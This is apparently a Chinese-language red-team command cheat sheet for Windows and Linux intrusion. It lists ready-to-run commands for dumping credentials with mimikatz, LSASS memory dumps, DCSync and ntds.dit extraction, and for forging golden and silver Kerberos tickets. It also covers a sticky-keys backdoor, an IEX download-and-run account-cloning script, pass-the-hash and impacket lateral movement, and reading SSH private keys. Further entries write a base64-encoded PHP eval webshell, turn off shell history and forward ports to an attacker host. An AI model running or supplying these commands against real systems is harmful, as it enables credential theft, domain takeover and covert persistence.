name: Win-凭证获取
command:
🚀 mimikatz抓取当前登录密码:
mimikatz.exe "log hash.txt" "privilege::debug" "sekurlsa::logonPasswords" "exit"

🚀 mimikatz抓取本机SAM Hash:
mimikatz.exe "log hash.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"

🚀 mimikatz抓取域用户Hash (需域管权限):
mimikatz.exe "log hash.txt" "lsadump::dcsync /domain:offensive.local /all /csv" "exit"
mimikatz.exe "log hash.txt" "lsadump::dcsync /domain:offensive.local /user:Administrator" "exit"
mimikatz.exe "log hash.txt" "lsadump::dcsync /domain:offensive.local /user:krbtgt" "exit"

🚀 procdump导出LSASS内存
procdump64.exe -accepteula -ma lsass.exe C:\programdata\lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"

🚀 comsvcs.dll导出LSASS内存 (需管理员权限)
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %i C:\programdata\lsass.dmp full

🚀 DumpMinitool.exe导出内存 (微软签名)
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do DumpMinitool.exe --file dump.dmp --processId %i --dumpType Full

🚀 注册表离线导出Hash
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\security security.hiv
secretsdump.exe -sam sam.hiv -security security.hiv -system system.hiv LOCAL
mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" "exit"

🚀 域控导出ntds.dit (需域管权限)
reg save HKLM\SYSTEM system.hiv
# 复制 ntds.dit 后离线解析:
secretsdump.exe -system system.hiv -ntds ntds.dit LOCAL
# 或远程导出:
secretsdump.exe domain/administrator:Admin12345@192.168.1.10 -dc-ip 192.168.1.10

🚀 卷影拷贝获取域控凭证 (Server 2003/2008/2012)
ntdsutil.exe snapshot "activate instance ntds" create quit quit
ntdsutil.exe snapshot "mount {快照GUID}" quit quit
copy "C:\$SNAP_xxx$\Windows\NTDS\ntds.dit" C:\ntds.dit
ntdsutil.exe snapshot "umount {快照GUID}" "delete {快照GUID}" quit quit

🚀 获取系统保存的RDP密码
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
# mimikatz解密 (需先dump lsass或debug权限):
privilege::debug
dpapi::cred /in:{凭证文件}
sekurlsa::dpapi
dpapi::cred /in:{凭证文件} /masterkey:{MasterKey}
ts::logonpasswords
exit

🚀 获取系统保存的VPN/凭据
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
rundll32 keymgr.dll,KRShowKeyMgr

🚀 获取已连接WIFI密码
netsh wlan show profiles
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

name: Win-权限维持
command:
🚀 粘滞键后门 (需物理/控制台访问):
pushd C:\windows\system32
move sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe

🚀 克隆账号
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd

🚀 伪造黄金票据 (伪造TGT)
# 条件: 域管理员用户名、域名、域SID、krbtgt的NTLM Hash
net group "domain admins" /domain
ipconfig /all
wmic useraccount get name,sid
whoami /user
mimikatz.exe "lsadump::dcsync /domain:offensive.local /user:krbtgt" "exit"
kerberos::purge
kerberos::golden /admin:administrator /domain:offensive.local /sid:S-1-5-21-xxx /krbtgt:{NTLM_HASH} /ticket:golden.kirbi
kerberos::ptt golden.kirbi
kerberos::tgt
dir \\dc\c$

🚀 伪造白银票据 (伪造TGS)
# 条件: 域名、域SID、目标服务器FQDN、服务类型、服务账号NTLM Hash
# 票据约20分钟有效, 不产生域控通信日志
ipconfig /all
wmic useraccount get name,sid
whoami /user
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
kerberos::purge
kerberos::golden /user:administrator /id:500 /domain:offensive.local /sid:S-1-5-21-xxx /target:dc.offensive.local /rc4:{NTLM_HASH} /service:cifs /ptt
kerberos::tgt
dir \\dc\c$

command:

🚀 mimikatz Pass-The-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:{NTLM_HASH} /run:cmd.exe" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:{NTLM_HASH} /run:mstsc.exe /restrictedadmin" "exit"

🚀 impacket psexec (445端口, 需admin$共享)
psexec.exe domain/administrator:Admin12345@192.168.1.10 "whoami /user" -codec gbk
psexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 "whoami /user" -codec gbk

🚀 impacket wmiexec (135端口, 隐蔽性较好)
wmiexec.exe domain/administrator:Admin12345@192.168.1.10 "whoami /user" -codec gbk
wmiexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 "whoami /user" -codec gbk

🚀 impacket smbexec
smbexec.exe domain/administrator:Admin12345@192.168.1.10 -codec gbk
smbexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 "whoami /user" -codec gbk

🚀 impacket atexec (计划任务)
atexec.exe domain/administrator:Admin12345@192.168.1.10 "whoami /user" -codec gbk

🚀 impacket dcomexec
dcomexec.exe domain/administrator:Admin12345@192.168.1.10 -codec gbk
dcomexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 "whoami /user" -codec gbk

🚀 impacket smbclient
smbclient.exe domain/administrator:Admin12345@192.168.1.10
smbclient.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10

🚀 查看远程计算机进程
tasklist /S 192.168.1.10 /U domain\administrator /P P@ssw0rd /V

command:
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
cat ~/.ssh/authorized_keys
cat /etc/ssh/sshd_config

name: Linux-获取网络信息
command:
查看IP:
ifconfig -a
ip a
hostname -I

查看网络配置:
cat /etc/resolv.conf
cat /etc/hosts
iptables -L

查看端口:
netstat -tulnp
ss -tulnp
lsof -i :80

name: Linux-其他常用命令
command:
设置终端代理:
export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890

交互式shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

搜索文件:
find / -name pass.txt 2>/dev/null
find / -name *.properties | xargs grep password

base64写webshell(绕过关键字):
echo -n "PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+" | base64 -d > logo.php

添加hosts:
echo "192.168.1.10 dc.offensive.local offensive.local dc" >> /etc/hosts

当前会话不记录history:
unset HISTFILE; export HISTFILE=/dev/null; export HISTSIZE=0

name: Linux-端口转发
command:
LCX:
lcx -listen 4567 3389
lcx -slave attacker_ip 4567 127.0.0.1 3389

SSH本地转发:
ssh -L 8080:127.0.0.1:80 user@192.168.1.7

SSH远程转发:
ssh -R 8080:127.0.0.1:80 user@192.168.1.7

SSH动态代理:
ssh -D 127.0.0.1:9050 -N user@192.168.1.7
proxychains curl http://127.0.0.1

name: Linux-写文件
command:
echo xxxxx== | base64 -d > /var/www/html/1.jsp
echo "content" > /tmp/file.txt
echo "content" >> /tmp/file.txt

name: Linux-网络Ping探测
command:
for i in 192.168.0.{1..254}; do ping -c 1 -W 1 $i &>/dev/null && echo $i is alive; done
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo 192.168.1.$i; done

name: Linux-查看SSH登录记录
command:
CentOS/RHEL: grep 'Accepted' /var/log/secure
Ubuntu/Debian: grep 'Accepted' /var/log/auth.log
last
lastlog
